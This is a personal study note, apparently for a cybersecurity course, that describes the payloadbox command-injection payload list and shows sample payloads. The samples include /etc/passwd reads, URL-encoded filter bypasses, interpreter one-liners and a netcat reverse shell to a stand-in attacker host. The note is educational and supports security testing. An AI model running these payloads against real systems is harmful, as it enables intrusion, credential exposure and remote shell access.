---
created:
  - 08-19-2024 15:34
backlinks:
  - "[[002 - Areas/2.0 WGU 📝/D484/Tools]]"
---
# ❗ Information
**Related to:** Command Injection  
**Tags:** [[Cybersecurity]], [[Injection]], [[Payloads]]

# 💻 Application -> command-injection-payload-list

## 🧾 Description
This repository provides an extensive list of command injection payloads that can be used for security testing and research purposes. Command injection is a type of vulnerability where an attacker can execute arbitrary commands on the host operating system via a vulnerable application.

## 🌐 Link
- [Command Injection Payload List](https://github.com/payloadbox/command-injection-payload-list)

## 🤸 Examples
Here are some examples of command injection payloads:

1. **Basic Payloads:**
   ```bash
   ; ls -la
   && cat /etc/passwd
   | whoami
   ```

2. **Using Special Characters:**
   ```bash
   `id`
   $(uname -a)
   || ps aux
   ```

3. **Chaining Commands:**
   ```bash
   ; echo "Injection Successful"
   && mkdir /tmp/hacked
   | nc -e /bin/sh hacker.example.com 8080
   ```

4. **Bypassing Filters:**
   ```bash
    %0a ls 
    %26 cat /etc/passwd 
    %7c whoami 
    %60 id 
    %24(uname -a)
    ```

5. **Advanced Payloads:**
   ```bash
    ; python3 -c 'import os; os.system("id")'
    && perl -e 'system("ls")'
    | ruby -e 'exec("whoami")'
    || echo 'hacked' > /tmp/hacked.txt 
    ```

These examples demonstrate various techniques to exploit command injection vulnerabilities by using different characters and methods to chain commands, bypass filters, and execute arbitrary commands on the target system. The provided link contains a comprehensive list of such payloads for deeper exploration and usage in security testing.

---

Remember to always use these payloads ethically and within the bounds of legal permissions when performing security tests.